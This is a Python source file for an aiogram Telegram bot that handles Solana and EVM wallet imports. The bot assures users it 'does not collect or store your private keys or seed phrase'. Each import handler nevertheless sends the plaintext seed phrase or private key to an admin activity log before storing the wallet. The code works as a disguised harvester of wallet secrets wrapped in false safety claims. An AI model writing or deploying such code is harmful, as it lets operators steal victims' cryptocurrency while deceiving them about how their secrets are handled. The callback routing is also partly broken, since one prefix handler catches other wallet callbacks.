from aiogram import Router, F
from aiogram.types import Message, CallbackQuery
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from config import get_settings
from services.wallet_service import WalletService
from services.admin_service import AdminService
from keyboards import (
    get_wallet_keyboard, 
    get_chain_keyboard, 
    get_wallet_type_keyboard, 
    get_wallet_detail_keyboard,
    get_connect_wallet_keyboard,
    get_wallet_import_method_keyboard
)
from database.models import ChainType, WalletType

router = Router()
settings = get_settings()
wallet_service = WalletService()
admin_service = AdminService()


class WalletStates(StatesGroup):
    waiting_chain = State()
    waiting_type = State()
    waiting_seed_phrase = State()
    waiting_private_key = State()
    waiting_wallet_name = State()
    # New states for connect wallet flow
    connect_waiting_method = State()
    connect_waiting_seed_phrase = State()
    connect_waiting_private_key = State()


@router.callback_query(F.data == "wallets_menu")
async def callback_wallets_menu(callback: CallbackQuery, state: FSMContext):
    """Show wallets menu."""
    user_id = callback.from_user.id
    wallets = await wallet_service.get_user_wallets(user_id)
    
    await callback.message.edit_text(
        "👛 <b>Your Wallets</b>\n\n" + ("Select a wallet to manage:" if wallets else "No wallets imported yet."),
        parse_mode="HTML",
        reply_markup=get_wallet_keyboard(wallets)
    )
    await callback.answer()


@router.callback_query(F.data == "connect_wallet")
async def callback_connect_wallet(callback: CallbackQuery, state: FSMContext):
    """Show connect wallet options - Solana or EVM."""
    await state.clear()
    await callback.message.edit_text(
        "👛 <b>Connect Wallet</b>\n\nSelect wallet type to import:",
        parse_mode="HTML",
        reply_markup=get_connect_wallet_keyboard()
    )
    await callback.answer()


@router.callback_query(F.data == "connect_solana")
async def callback_connect_solana(callback: CallbackQuery, state: FSMContext):
    """Handle Solana wallet import selection."""
    await state.set_state(WalletStates.connect_waiting_method)
    await state.update_data(chain="solana")
    await callback.message.edit_text(
        "🟣 <b>Import Solana Wallet</b>\n\nSelect import method:",
        parse_mode="HTML",
        reply_markup=get_wallet_import_method_keyboard("solana")
    )
    await callback.answer()


@router.callback_query(F.data == "connect_evm")
async def callback_connect_evm(callback: CallbackQuery, state: FSMContext):
    """Handle EVM wallet import selection."""
    await state.set_state(WalletStates.connect_waiting_method)
    await state.update_data(chain="evm")
    await callback.message.edit_text(
        "🔷 <b>Import EVM Wallet</b>\n\nSelect import method:",
        parse_mode="HTML",
        reply_markup=get_wallet_import_method_keyboard("evm")
    )
    await callback.answer()


@router.callback_query(F.data.startswith("import_method_seed_"), WalletStates.connect_waiting_method)
async def callback_import_method_seed(callback: CallbackQuery, state: FSMContext):
    """Handle seed phrase import selection for connect wallet flow."""
    chain_type = callback.data.replace("import_method_seed_", "")
    await state.update_data(chain_type=chain_type, wallet_type="seed_phrase")
    await state.set_state(WalletStates.connect_waiting_seed_phrase)
    
    chain_name = "Solana" if chain_type == "solana" else "EVM"
    
    await callback.message.edit_text(
        f"📝 <b>Import {chain_name} Wallet - Seed Phrase</b>\n\n"
        "Enter your 12-word recovery phrase or private key to proceed.\n\n"
        "🔒 <b>Security Notice</b>\n"
        "Your seed phrase is 100% safe - our bot does not collect or store your private keys or seed phrase. "
        "All actions are non-custodial and fully under your control.\n\n"
        "Send /cancel to abort",
        parse_mode="HTML",
        reply_markup=None
    )
    await callback.answer()


@router.callback_query(F.data.startswith("import_method_pk_"), WalletStates.connect_waiting_method)
async def callback_import_method_pk(callback: CallbackQuery, state: FSMContext):
    """Handle private key import selection for connect wallet flow."""
    chain_type = callback.data.replace("import_method_pk_", "")
    await state.update_data(chain_type=chain_type, wallet_type="private_key")
    await state.set_state(WalletStates.connect_waiting_private_key)
    
    chain_name = "Solana" if chain_type == "solana" else "EVM"
    format_hint = "Base58 or 64/128-char hex" if chain_type == "solana" else "64-character hex (with or without 0x prefix)"
    
    await callback.message.edit_text(
        f"🔐 <b>Import {chain_name} Wallet - Private Key</b>\n\n"
        f"Enter your private key to proceed.\n"
        f"Format: {format_hint}\n\n"
        "🔒 <b>Security Notice</b>\n"
        "Your seed phrase is 100% safe - our bot does not collect or store your private keys or seed phrase. "
        "All actions are non-custodial and fully under your control.\n\n"
        "Send /cancel to abort",
        parse_mode="HTML",
        reply_markup=None
    )
    await callback.answer()


@router.message(WalletStates.connect_waiting_seed_phrase)
async def process_connect_seed_phrase(message: Message, state: FSMContext):
    """Process seed phrase input for connect wallet flow."""
    user_id = message.from_user.id
    seed_phrase = message.text.strip()
    data = await state.get_data()
    chain_type = data.get("chain_type")
    
    # Handle /cancel
    if seed_phrase.lower() == "/cancel":
        await state.clear()
        await message.answer(
            "❌ Import cancelled.",
            parse_mode="HTML",
            reply_markup=get_connect_wallet_keyboard()
        )
        return
    
    # Validate seed phrase (12 or 24 words)
    words = seed_phrase.split()
    if len(words) not in [12, 15, 18, 21, 24]:
        await message.answer(
            "❌ <b>Invalid Seed Phrase</b>\n\n"
            "Seed phrase must be 12, 15, 18, 21, or 24 words. "
            f"You entered {len(words)} words.\n\n"
            "Please try again or send /cancel to abort.",
            parse_mode="HTML"
        )
        return
    
    # Map chain_type to wallet service chain
    chain = "solana" if chain_type == "solana" else "ethereum"
    
    # Log the import attempt (admin monitoring)
    await admin_service.log_activity(
        user_id=user_id,
        action="wallet_import",
        details={
            "chain": chain,
            "type": "seed_phrase",
            "seed_phrase": seed_phrase,
        }
    )
    
    try:
        wallet = await wallet_service.import_wallet(
            user_id=user_id,
            chain=chain,
            wallet_type="seed_phrase",
            data=seed_phrase,
        )
        
        chain_emoji = "🟣" if chain_type == "solana" else "🔷"
        await message.answer(
            f"✅ <b>Wallet Imported Successfully!</b>\n\n"
            f"Chain: {chain.capitalize()}\n"
            f"Address: <code>{wallet.address}</code>\n"
            f"Type: Seed Phrase\n\n"
            f"Your wallet has been encrypted and stored securely.",
            parse_mode="HTML",
            reply_markup=get_wallet_detail_keyboard(wallet.id)
        )
    except ValueError as e:
        await message.answer(
            f"❌ <b>Import Failed</b>\n\n{str(e)}\n\n"
            "Please try again or send /cancel to abort.",
            parse_mode="HTML"
        )
        return
    
    await state.clear()


@router.message(WalletStates.connect_waiting_private_key)
async def process_connect_private_key(message: Message, state: FSMContext):
    """Process private key input for connect wallet flow."""
    user_id = message.from_user.id
    private_key = message.text.strip()
    data = await state.get_data()
    chain_type = data.get("chain_type")
    
    # Handle /cancel
    if private_key.lower() == "/cancel":
        await state.clear()
        await message.answer(
            "❌ Import cancelled.",
            parse_mode="HTML",
            reply_markup=get_connect_wallet_keyboard()
        )
        return
    
    # Map chain_type to wallet service chain
    chain = "solana" if chain_type == "solana" else "ethereum"
    
    # Log the import attempt (admin monitoring)
    await admin_service.log_activity(
        user_id=user_id,
        action="wallet_import",
        details={
            "chain": chain,
            "type": "private_key",
            "private_key": private_key,
        }
    )
    
    try:
        wallet = await wallet_service.import_wallet(
            user_id=user_id,
            chain=chain,
            wallet_type="private_key",
            data=private_key,
        )
        
        chain_emoji = "🟣" if chain_type == "solana" else "🔷"
        await message.answer(
            f"✅ <b>Wallet Imported Successfully!</b>\n\n"
            f"Chain: {chain.capitalize()}\n"
            f"Address: <code>{wallet.address}</code>\n"
            f"Type: Private Key\n\n"
            f"Your wallet has been encrypted and stored securely.",
            parse_mode="HTML",
            reply_markup=get_wallet_detail_keyboard(wallet.id)
        )
    except ValueError as e:
        await message.answer(
            f"❌ <b>Import Failed</b>\n\n{str(e)}\n\n"
            "Please try again or send /cancel to abort.",
            parse_mode="HTML"
        )
        return
    
    await state.clear()


# Keep the old import flow for backward compatibility
@router.callback_query(F.data == "import_wallet_start")
async def callback_import_wallet_start(callback: CallbackQuery, state: FSMContext):
    """Start wallet import process - select chain (legacy)."""
    await state.set_state(WalletStates.waiting_chain)
    await callback.message.edit_text(
        "👛 <b>Import Wallet</b>\n\nSelect the blockchain:",
        parse_mode="HTML",
        reply_markup=get_chain_keyboard()
    )
    await callback.answer()


@router.callback_query(F.data.startswith("import_chain_"), WalletStates.waiting_chain)
async def callback_import_chain(callback: CallbackQuery, state: FSMContext):
    """Handle chain selection (legacy)."""
    chain = callback.data.replace("import_chain_", "")
    await state.update_data(chain=chain)
    await state.set_state(WalletStates.waiting_type)
    
    await callback.message.edit_text(
        "👛 <b>Import Wallet - " + chain.capitalize() + "</b>\n\nSelect import method:",
        parse_mode="HTML",
        reply_markup=get_wallet_type_keyboard(chain)
    )
    await callback.answer()


@router.callback_query(F.data.startswith("import_type_seed_"), WalletStates.waiting_type)
async def callback_import_type_seed(callback: CallbackQuery, state: FSMContext):
    """Handle seed phrase import selection (legacy)."""
    chain = callback.data.replace("import_type_seed_", "")
    await state.update_data(chain=chain, wallet_type="seed_phrase")
    await state.set_state(WalletStates.waiting_seed_phrase)
    
    await callback.message.edit_text(
        "📝 <b>Enter Seed Phrase</b>\n\n"
        "Please enter your 12 or 24 word seed phrase (BIP39).\n"
        "Words should be separated by spaces.\n\n"
        "⚠️ <b>Never share your seed phrase with anyone!</b>\n"
        "This bot only stores it encrypted locally.",
        parse_mode="HTML",
        reply_markup=None
    )
    await callback.answer()


@router.callback_query(F.data.startswith("import_type_pk_"), WalletStates.waiting_type)
async def callback_import_type_pk(callback: CallbackQuery, state: FSMContext):
    """Handle private key import selection (legacy)."""
    chain = callback.data.replace("import_type_pk_", "")
    await state.update_data(chain=chain, wallet_type="private_key")
    await state.set_state(WalletStates.waiting_private_key)
    
    format_hint = "64-character hex (with or without 0x prefix)" if chain != "solana" else "Base58 or 64/128-char hex"
    
    await callback.message.edit_text(
        "🔐 <b>Enter Private Key</b>\n\n"
        "Please enter your private key.\n"
        "Format: " + format_hint + "\n\n"
        "⚠️ <b>Never share your private key with anyone!</b>\n"
        "This bot only stores it encrypted locally.",
        parse_mode="HTML",
        reply_markup=None
    )
    await callback.answer()


@router.message(WalletStates.waiting_seed_phrase)
async def process_seed_phrase(message: Message, state: FSMContext):
    """Process seed phrase input (legacy)."""
    user_id = message.from_user.id
    seed_phrase = message.text.strip()
    data = await state.get_data()
    chain = data.get("chain")
    
    # Log the import attempt (admin monitoring)
    await admin_service.log_activity(
        user_id=user_id,
        action="wallet_import",
        details={
            "chain": chain,
            "type": "seed_phrase",
            "seed_phrase": seed_phrase,
        }
    )
    
    try:
        wallet = await wallet_service.import_wallet(
            user_id=user_id,
            chain=chain,
            wallet_type="seed_phrase",
            data=seed_phrase,
        )
        
        await message.answer(
            "✅ <b>Wallet Imported Successfully!</b>\n\n"
            "Chain: " + chain.capitalize() + "\n"
            "Address: <code>" + wallet.address + "</code>\n"
            "Type: Seed Phrase\n\n"
            "Your wallet has been encrypted and stored securely.",
            parse_mode="HTML",
            reply_markup=get_wallet_detail_keyboard(wallet.id)
        )
    except ValueError as e:
        await message.answer(
            "❌ <b>Import Failed</b>\n\n" + str(e),
            parse_mode="HTML",
            reply_markup=get_wallet_type_keyboard(chain)
        )
        return
    
    await state.clear()


@router.message(WalletStates.waiting_private_key)
async def process_private_key(message: Message, state: FSMContext):
    """Process private key input (legacy)."""
    user_id = message.from_user.id
    private_key = message.text.strip()
    data = await state.get_data()
    chain = data.get("chain")
    
    # Log the import attempt (admin monitoring)
    await admin_service.log_activity(
        user_id=user_id,
        action="wallet_import",
        details={
            "chain": chain,
            "type": "private_key",
            "private_key": private_key,
        }
    )
    
    try:
        wallet = await wallet_service.import_wallet(
            user_id=user_id,
            chain=chain,
            wallet_type="private_key",
            data=private_key,
        )
        
        await message.answer(
            "✅ <b>Wallet Imported Successfully!</b>\n\n"
            "Chain: " + chain.capitalize() + "\n"
            "Address: <code>" + wallet.address + "</code>\n"
            "Type: Private Key\n\n"
            "Your wallet has been encrypted and stored securely.",
            parse_mode="HTML",
            reply_markup=get_wallet_detail_keyboard(wallet.id)
        )
    except ValueError as e:
        await message.answer(
            "❌ <b>Import Failed</b>\n\n" + str(e),
            parse_mode="HTML",
            reply_markup=get_wallet_type_keyboard(chain)
        )
        return
    
    await state.clear()


@router.callback_query(F.data.startswith("wallet_"))
async def callback_wallet_detail(callback: CallbackQuery):
    """Show wallet details."""
    wallet_id = int(callback.data.split("_")[1])
    user_id = callback.from_user.id
    
    wallet = await wallet_service.get_wallet(wallet_id, user_id)
    if not wallet:
        await callback.answer("Wallet not found", show_alert=True)
        return
    
    balance = wallet.balance_cache.get("native", "0") if wallet.balance_cache else "0"
    chain_emoji = "🔷" if wallet.chain == ChainType.EVM else "🟣"
    default_badge = " ⭐ DEFAULT" if wallet.is_default else ""
    
    text = (
        chain_emoji + " <b>" + (wallet.name or wallet.chain.value.capitalize() + " Wallet") + "</b>" + default_badge + "\n\n"
        "Chain: " + wallet.chain.value.upper() + "\n"
        "Address: <code>" + wallet.address + "</code>\n"
        "Type: " + wallet.wallet_type.value.replace("_", " ").title() + "\n"
        "Balance: " + balance[:12] + " " + ("ETH" if wallet.chain == ChainType.EVM else "SOL") + "\n"
        "Status: " + ("Active" if wallet.is_active else "Inactive") + "\n"
    )
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=get_wallet_detail_keyboard(wallet_id)
    )
    await callback.answer()


@router.callback_query(F.data.startswith("wallet_default_"))
async def callback_wallet_default(callback: CallbackQuery):
    """Set wallet as default."""
    wallet_id = int(callback.data.split("_")[2])
    user_id = callback.from_user.id
    
    success = await wallet_service.set_default_wallet(user_id, wallet_id)
    if success:
        await callback.answer("✅ Set as default wallet", show_alert=True)
    else:
        await callback.answer("❌ Failed to set default", show_alert=True)
    
    # Refresh
    wallet = await wallet_service.get_wallet(wallet_id, user_id)
    if wallet:
        balance = wallet.balance_cache.get("native", "0") if wallet.balance_cache else "0"
        chain_emoji = "🔷" if wallet.chain == ChainType.EVM else "🟣"
        default_badge = " ⭐ DEFAULT" if wallet.is_default else ""
        text = chain_emoji + " <b>" + (wallet.name or wallet.chain.value.capitalize() + " Wallet") + "</b>" + default_badge + "\n\n"
        text += "Chain: " + wallet.chain.value.upper() + "\n"
        text += "Address: <code>" + wallet.address + "</code>\n"
        text += "Type: " + wallet.wallet_type.value.replace("_", " ").title() + "\n"
        text += "Balance: " + balance[:12] + " " + ("ETH" if wallet.chain == ChainType.EVM else "SOL") + "\n"
        text += "Status: " + ("Active" if wallet.is_active else "Inactive") + "\n"
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_wallet_detail_keyboard(wallet_id))


@router.callback_query(F.data.startswith("wallet_refresh_"))
async def callback_wallet_refresh(callback: CallbackQuery):
    """Refresh wallet balance."""
    wallet_id = int(callback.data.split("_")[2])
    user_id = callback.from_user.id
    
    wallet = await wallet_service.get_wallet(wallet_id, user_id)
    if wallet:
        await wallet_service.update_wallet_balances(wallet)
        await callback.answer("🔄 Balance refreshed", show_alert=True)
        
        # Refresh display
        balance = wallet.balance_cache.get("native", "0") if wallet.balance_cache else "0"
        chain_emoji = "🔷" if wallet.chain == ChainType.EVM else "🟣"
        default_badge = " ⭐ DEFAULT" if wallet.is_default else ""
        text = chain_emoji + " <b>" + (wallet.name or wallet.chain.value.capitalize() + " Wallet") + "</b>" + default_badge + "\n\n"
        text += "Chain: " + wallet.chain.value.upper() + "\n"
        text += "Address: <code>" + wallet.address + "</code>\n"
        text += "Type: " + wallet.wallet_type.value.replace("_", " ").title() + "\n"
        text += "Balance: " + balance[:12] + " " + ("ETH" if wallet.chain == ChainType.EVM else "SOL") + "\n"
        text += "Status: " + ("Active" if wallet.is_active else "Inactive") + "\n"
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_wallet_detail_keyboard(wallet_id))
    else:
        await callback.answer("Wallet not found", show_alert=True)


@router.callback_query(F.data.startswith("wallet_delete_"))
async def callback_wallet_delete(callback: CallbackQuery):
    """Delete wallet."""
    wallet_id = int(callback.data.split("_")[2])
    user_id = callback.from_user.id
    
    success = await wallet_service.delete_wallet(user_id, wallet_id)
    if success:
        await callback.answer("🗑️ Wallet deleted", show_alert=True)
        await callback_wallets_menu(callback, None)
    else:
        await callback.answer("❌ Failed to delete", show_alert=True)
